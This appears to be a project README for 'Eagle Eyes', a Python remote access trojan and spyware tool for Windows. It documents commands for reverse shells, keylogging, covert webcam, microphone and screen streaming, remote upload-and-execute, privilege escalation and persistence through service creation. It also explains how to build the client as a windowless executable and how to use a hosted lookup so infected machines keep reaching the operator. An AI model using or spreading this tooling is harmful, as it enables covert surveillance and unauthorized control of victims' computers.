# Eagle-Eyes
Eagle Eyes => A powerful low level TCP networking RAT written in the Python langauge for Windows.
___
Eagle Eyes is a spyware Python program created for Windows that supports multiple ways to collect data & automatically save everything organized in folders. It has two shells you will use, the first shell is to control & manage clients & options. It is also from this shell you have can connect to a client session. This will give a reverse shell like connection to a specific client with extra built in commands.
___
## Examples of running the server script:
- Python server.py
- Python server.py -h
## Examples of running the client script:
- Python client.py
___
## Tips
Your server address might be changing when specifying it in the client script so you can use a webserver to host the data & simply updating the webserver. To specify this you simply setup a webserver with on https://heroku.com & make a request to the server by passing in the constructor of the Client class at the bottom of the client.py script. 

__Example of this__

data = requests.get('https://your_app_name.herokuapp.com/').json()

client = Client(data['ip'], data['port'], data['encoding'])
___
## Making the script an exe
__To make your script an exe you can use Pyinstaller with "pip install pyinstaller".__

Here are some examples of creating the executeable:

- pyinstaller -F -i YOUR_SERVER_ICON.ico server.py

Using the "YOUR_SERVER_ICON.ico" as icon with "-i" & making it a single file with "-F".
- pyinstaller -F -w -i YOUR_CLIENT_ICON.ico client.py

Also using "-w" when building the client script to make it a windowless application.
___
### Supported Features:
  - TCP Network stream (IPv4)
  - Compression & AES256 Encryption
  - Multi Threaded
  - Remote Shell
    - Command Threading
    - Command Visualization
    - Command Backup
  - Desktop Stream
  - Cam Stream
  - Audio Listener
  - Audio Output
  - Keylogger
    - Logs Visualization
  - Screenshot
  - Webcam Screenshot
  - Show Messagebox
  - Visit Website
  - Upload (& Execute)
  - Download (& Execute)
  - Botnet like functionality
  - Privilege Escalation
  - Service Creation
  - System Information
  - Location Data
___
- () = Required
- [] = Optional
- | = Or
___
## Shell Commands:
___
- Running

Get data about all the running modules, what client it is running on & its identifying number.

- Stream (Client Index)
  - Stream Kill (Client Index | *)

To open a stream of a specific client, opening a window of the clients screen in a live feed.
- Cam (Client Index) (Camera Number) (Height,Width)
  - Cam Kill (Client Index | *)

To open a camera stream of the users live webcam, needing to know what webcam number you want to use & the size of the camera. With the help of the devices command this information is provided.
- Audio (Client Index)
  - Audio Kill (Client Index | *)

Listen to a clients microphone input live.
- Keylogger (Client Index)
  - Keylogger Kill (Client Index | *)
  - Keylogger Text (Client Index)
  - Keylogger Image (Client Index)

Log every key of a client with the option to write out these logs directly in the console or by creating an black & white image of the text.
- Talk (Client Index)
  - Talk Kill (Client Index | *)

Talk directly with the client, in combination with the audio module you can create an audio conversation. 
- Server (Ms-Dos Command)

If you need to use your command prompt of your server, you can do it from within the program.
- Archive (Client Username | -a)

Archive the data collected from a specific client or all clients with "-a". This will remove the folder of either the single user or all users after them being archived.
- Whoami (Client Index)

If you've not used whoami upon connect option you can do it manually, gathering vital system information & location data of a client.
- All (Session Command)

Sent a single command to every client & get everyones response. This will create a slight feeling of a botnet but it is slower & is executed in a linear fashion.
- List [-l] | Ls [-l]

List all the connected clients, either with basic information or a long list of who this person is with the "-l" flag.
- Session (Client Index)

Upon a session with a specific client, this will make more commands available without the "all" or "client" commands & be receptive to command prompt data responses. Note that this session will be timed out after 2 minutes of inactivity returning you back to the managing Shell to be able to keep all the clients alive even when no data is being sent between the sockets. If this happens, you can just reconnect & proceed.
- Client (Client Index) (Session Command)

Send a session command to a specific client without entering a session with this client.
- Del (Client Index | *)

Delete one or more clients from your server, disconnecting them from you.
- Options

This will print to the console all available options you can set to improve your experience & change how the program is running.
- Set (Setting=Value)

This will set one of the options provided by the "options" command.
- Time

This will print out the time you've started the program & the current time.
- Banner

Print out the banner that is shown when initially running the program.
- Clear | Cls

Clear the console.
- Exit | Quit

Exit the program for good.
___
## Session Commands:
___
- Running

This will return all the running modules (Stream, Cam, Audio, Keylogger, Talk), what client this module is running on & what index that module is bound to, because you can run as many modules on any & all clients at any time you will need to specify that modules id when using module commands shown below.
- Stream [IP:PORT]
  - Stream Kill (Stream Index)

Stream module along with all the other modules will allow you to specify a custom socket address to connect with, this is usefull if you're using port tunneling to make ports available without the need of port forwarding, otherwise if not specified it will automatically connect to the same module port & ip of the host.
- Cam [IP:PORT] (Camera Number) (With,Height)
  - Cam Kill (Cam Index)

Cam module need the camera number, if you have 2 cameras if you want to use the second camera you will have to use number 1, else if the client only has one camera use 0. You will also have to specify the width & height of the camera, this is because of a bug in the cv2 module making it neccesary to save a video file of the camera stream. You can use the devices command to find out the camera number & its size.
- Audio [IP:PORT]
  - Audio Kill (Audio Index)

The audio module will let you hear any input provided by the client into their microphone.
- Keylogger [IP:PORT]
  - Keylogger Kill (Keylogger Index)
  - Keylogger Text (Keylogger Index)
  - Keylogger Image (Keylogger Index)

The keylogger module gives you the option of writing out all the logs provided by the client in text format or vizualize the text into an black & white image with the help of the text & image commands.
- Talk [IP:PORT]
  - Talk Kill (Talk Index)

The talk module will allow you to talk into your microphone & the client will hear you, this can be used in conjunction with the audio module creating a audio conversation possibility.
- Upload (File Name) [-e]

The "-e" option will automatically execute the uploaded file on the clients computer.
- Note => [File Name] => (Message)

The note command will create a specific folder storing all your notes about a specific client with timestamps. The "File Name" is an option because otherwise it will be saved to global.txt as it is the default, .txt will also automatically if you choose to set a file name. This command can be used to handle & organize your thoughts & ideas when dealing with multiple clients. Having the notes as a backup.
- Whoami

The whoami command provides you with all the systeminfo & location data along with the initial socket data written out to the console. Making it clear who this client is & all the neccesary data you will need.
- Time

Gives you the time the session started & what the current time is.
- Clear | Cls

Clears the console.
- Exit | Quit

Exit the session & go back to your managing Shell.
- Download (File Name) [-e]

Download a file with the option to execute upon successful download.
- Screenshot [-s]

Download a screenshot of the clients computer with the option to automatically show the screenshot taken.
- Webcam (Camera Number) [-s]

Webcam will take a screenshot of a specified camera with the help of the camera number, with the option to automatically show the screenshot taken.
- cd (File Path)

Change the directory of you session shell & navigate as you would a normal command prompt. Note that system variables cannot be used.
- Elevate (File Path)

This will attempt to run the specified executeable program as administrator, if you run this on this script successfully you will be provided with an administrator shell having the privilege to create services & edit the Windows registry.
- Service (Type) (Service Name) (File Path)

If you successfully acquired a administrator shell you can create & edit services. This will make your script sticky, automatically running the program upon startup without any questions. First have to specify either to "delete" or "create" the service, the name of Z service & the absolute path of the executeable.
- Devices

Get all the webcams available on the client computer, the sizes of the cameras & their camera number.
- Message => [Title] => (Message) => [Style]

Show a message box to the client, the title of the messagebox, the default is "Message", the text of the message box & optionally the icon to be used ranging from 1-4.
- Open (Url[,Url2, Url3, Url4])

Opens one or more urls in the clients default browser.
- ps (Powershell Command)

A shorthand for using powershell commands in your command prompt shell.
- Else Command Prompt Data [-t] [-b] [-i]

If no built in command is used everything will be thrown into the clients command prompt as a subprocess returning the data provided. The flags available is "-t" which will thread the command not displaying any data on screen but will execute the command. The "-b" flag will backup the data returned into a textfile & "-i" will provide a black & white image of the results, saving it to a png file. The "-t" flag can't be used in conjunction with "-b" or "-i" but "-b" & "-i" can be used together, in any order just as long as they are in the end of the string data being sent.
___
## Options Available
___
- Quick Mode

Simply sets "history" & "whoami" to False. 
- Username

Set username of the server, default is your Windows username provided by the username enviorment variable.
- Theme

Sets the color theme of the console, available themes:
  - light
  - dark
  - shade
  - star
  - diamond
  - blood
  - sky
  - hacker

Default is light.

- Encoding

How every byte sent over the sockets will be translated in, latin-1 is the default & it supports any & all characters which utf-8 does not. But the option is open to change after preference.
- History

This option will create a log & timestamp of when a given client connects & disconnects. Default is True.
- Whoami

Upon connection systeminfo & location data will be gathered to be saved in a file of the users folder. Default is True.
- Notice

A system notification upon connection & disconnection of clients. Default is False.
- Duplicates

To allow multiple connections from one client to be allowed. Deafult is True.
- Email Notice
  - Email
  - Password
  - To

Get a email notice everytime a client connects, you will have to provide a gmail & gmail password that allows "unsafe" applications to use the email. Also if you want to send this notification to multiple people the "to" option allows that, but by default "to" will automatically be set to your own email. Default is False.
___
## Command Line Unique Options
___
All of the options above can be set with the help of command line arguments when running the program. But there are also some unique ones.

* --banner | -b

To not show banner upon running script. Default is False.
* --internet_protocol (IP) | -ip (IP)

To specify the hosting IP of the server, default is 127.0.0.1.
* --port (Port) | -p (Port)

To specify a port which you client script will connect to. Default is 1200.
* --module_ports (Module Ports) | -mP (Module Ports)

The ports of the modules, because they use individual socket connections. Default is 1201,1202,1203,1204,1205.
* --use_latest | -uL

To use the most recent "IP", "Port" & "Module Ports" if you simply want to use what you used last time running the script. Default is False.

** To get every flag available as a command line argument simply run the script with as such: "Python server.py -h".**
